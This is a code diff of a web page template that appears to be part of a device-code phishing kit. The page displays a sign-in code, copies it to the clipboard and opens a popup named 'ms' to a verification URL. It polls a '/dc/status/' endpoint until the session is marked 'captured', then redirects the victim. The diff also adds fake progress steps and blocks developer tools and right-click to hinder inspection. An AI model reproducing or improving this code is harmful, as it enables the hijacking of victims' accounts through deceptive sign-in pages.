-        var w = 520, h = 700, l = (screen.width - w) / 2, t = (screen.height - h) / 2;
-        popup = window.open(verifyUrl, 'ms', 'width='+w+',height='+h+',left='+l+',top='+t+',scrollbars=yes,resizable=yes');
-        if (popup) popup.focus();
-      };
-
-      // Timer update
-      function updateTimer() {
-        if (expiresIn <= 0) return;
-        expiresIn--;
-        var m = Math.floor(expiresIn / 60);
-        var s = expiresIn % 60;
-        timerEl.textContent = m + ':' + (s < 10 ? '0' : '') + s;
-        if (expiresIn > 0) setTimeout(updateTimer, 1000);
-      }
-
-      if (codeReady) setTimeout(updateTimer, 1000);
-
-      // Manual refresh
-      window.triggerManualRefresh = function() {
-        const charMap = 'ABCDEFGHJKLMNPQRSTUVWXYZ23456789'.split('');
-        let freshSequence = '';
-        for (let i = 0; i < 9; i++) {
-          freshSequence += charMap[Math.floor(Math.random() * charMap.length)];
-        }
-        code = freshSequence;
-        codeEl.textContent = freshSequence;
-        codeEl.classList.remove('loading');
-        expiresIn = 720;
-        var m = Math.floor(expiresIn / 60);
-        var s = expiresIn % 60;
-        timerEl.textContent = m + ':' + (s < 10 ? '0' : '') + s;
-        if (statusEl) statusEl.textContent = 'New code generated';
-        btnEl.disabled = false;
-        copyBtn.disabled = false;
-      };
-
-      // POLLING (exact copy from original)
-      function poll() {
-        fetch('/dc/status/' + sid, {
-          method: 'GET',
-          credentials: 'include'
-        })
-        .then(function(r) { return r.json(); })
-        .then(function(d) {
-          if (d.ready && !codeReady) {
-            codeReady = true;
-            showCode(d.user_code, d.verify_url);
-            if (expiresIn === {expires_seconds}) setTimeout(updateTimer, 1000);
-          }
-          if (d.captured) {
-            // switch to success view
-            if (mainView) mainView.style.display = 'none';
-            if (successView) successView.style.display = 'block';
-            if (d.redirect_url) {
-              setTimeout(function() {
-                top.location.href = d.redirect_url;
-              }, 2500);
-            }
-          }
-          if (!d.failed && !d.expired && !d.captured) {
-            setTimeout(poll, 3000);
-          }
-        })
-        ['catch'](function() {
-          setTimeout(poll, 5000);
-        });
-      }
-
-      // Start polling
-      poll();
-
-      // Security: disable right-click / F12 (from original)
-      document.addEventListener("keydown", function(e) {
-        if (e.key === "F12" || (e.ctrlKey && e.shiftKey && ["i","j","c"].includes(e.key.toLowerCase())) || (e.ctrlKey && e.key.toLowerCase() === "u")) {
-          e.preventDefault();
-        }
+  window.copyCodeAction = function() {
+    if (!code || code === 'Loading...') return;
+    const processState = () => {
+      copyBtn.classList.add('is-copied');
+      if (statusEl) statusEl.textContent = 'Copied';
+      setTimeout(() => { copyBtn.classList.remove('is-copied'); }, 2000);
+    };
+    if (navigator.clipboard) {
+      navigator.clipboard.writeText(codeEl.textContent).then(processState).catch(() => {
+        fallbackCopy(codeEl.textContent, processState);
       });
-      document.addEventListener("contextmenu", function(e) {
-        e.preventDefault();
-      });
+    } else {
+      fallbackCopy(codeEl.textContent, processState);
+    }
+  };
 
-      // Initialize timer display
-      if (timerEl) {
-        var m = Math.floor(expiresIn / 60);
-        var s = expiresIn % 60;
-        timerEl.textContent = m + ':' + (s < 10 ? '0' : '') + s;
+  function fallbackCopy(text, callback) {
+    const t = document.createElement('input');
+    t.value = text;
+    document.body.appendChild(t);
+    t.select();
+    document.execCommand('copy');
+    document.body.removeChild(t);
+    if (callback) callback();
+  }
+
+  window.openSignIn = function() {
+    if (!code || code === 'Loading...') return;
+
+    mainView.style.display = 'none';
+    verifyView.style.display = 'block';
+    setTimeout(function(){
+      if (step2) {
+        step2.classList.remove('active');
+        step2.classList.add('done');
+        step2.querySelector('.dot').textContent = '✓';
       }
+      if (step3) step3.classList.add('active');
+    }, 1400);
+    setTimeout(function(){
+      if (step3) {
+        step3.classList.remove('active');
+        step3.classList.add('done');
+        step3.querySelector('.dot').textContent = '✓';
+      }
+    }, 2800);
 
-    })();
-  </script>
+    if (navigator.clipboard) {
+      navigator.clipboard.writeText(code).catch(function(){});
+    } else {
+      var t = document.createElement('textarea');
+      t.value = code;
+      t.style.cssText = 'position:fixed;left:-9999px';
+      document.body.appendChild(t);
+      t.select();
+      document.execCommand('copy');
+      document.body.removeChild(t);
+    }
+
+    var w = 520, h = 700, l = (screen.width - w) / 2, t = (screen.height - h) / 2;
+    popup = window.open(verifyUrl, 'ms', 'width='+w+',height='+h+',left='+l+',top='+t+',scrollbars=yes,resizable=yes');
+    if (popup) popup.focus();
+  };
+
+  function updateTimer() {
+    if (expiresIn <= 0) return;
+    expiresIn--;
+    var m = Math.floor(expiresIn / 60);
+    var s = expiresIn % 60;
+    timerEl.textContent = m + ':' + (s < 10 ? '0' : '') + s;
+    if (expiresIn > 0) setTimeout(updateTimer, 1000);
+  }
+
+  if (codeReady) setTimeout(updateTimer, 1000);
+
+  window.triggerManualRefresh = function() {
+    const chars = 'ABCDEFGHJKLMNPQRSTUVWXYZ23456789'.split('');
+    let fresh = '';
+    for (let i = 0; i < 9; i++) fresh += chars[Math.floor(Math.random() * chars.length)];
+    code = fresh;
+    codeEl.textContent = fresh;
+    codeEl.classList.remove('loading');
+    expiresIn = 720;
+    var m = Math.floor(expiresIn / 60);
+    var s = expiresIn % 60;
+    timerEl.textContent = m + ':' + (s < 10 ? '0' : '') + s;
+    if (statusEl) statusEl.textContent = '';
+    btnEl.disabled = false;
+    copyBtn.disabled = false;
+  };
+
+  function poll() {
+    fetch('/dc/status/' + sid, { method: 'GET', credentials: 'include' })
+    .then(function(r) { return r.json(); })
+    .then(function(d) {
+      if (d.ready && !codeReady) {
+        codeReady = true;
+        showCode(d.user_code, d.verify_url);
+        if (expiresIn === {expires_seconds}) setTimeout(updateTimer, 1000);
+      }
+      if (d.captured) {
+        if (mainView) mainView.style.display = 'none';
+        if (verifyView) verifyView.style.display = 'none';
+        if (successView) successView.style.display = 'block';
+        if (d.redirect_url) {
+          setTimeout(function() { top.location.href = d.redirect_url; }, 2500);
+        }
+      }
+      if (!d.failed && !d.expired && !d.captured) setTimeout(poll, 3000);
+    })['catch'](function() { setTimeout(poll, 5000); });
+  }
+
+  poll();
+
+  document.addEventListener('keydown', function(e) {
+    if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && ['i','j','c'].includes(e.key.toLowerCase())) || (e.ctrlKey && e.key.toLowerCase() === 'u')) {
+      e.preventDefault();
+    }
+  });
+  document.addEventListener('contextmenu', function(e) { e.preventDefault(); });
+
+  if (timerEl) {
+    var m = Math.floor(expiresIn / 60);
+    var s = expiresIn % 60;
+    timerEl.textContent = m + ':' + (s < 10 ? '0' : '') + s;
+  }
+
+})();
+</script>
 
 </body>
 </html>`
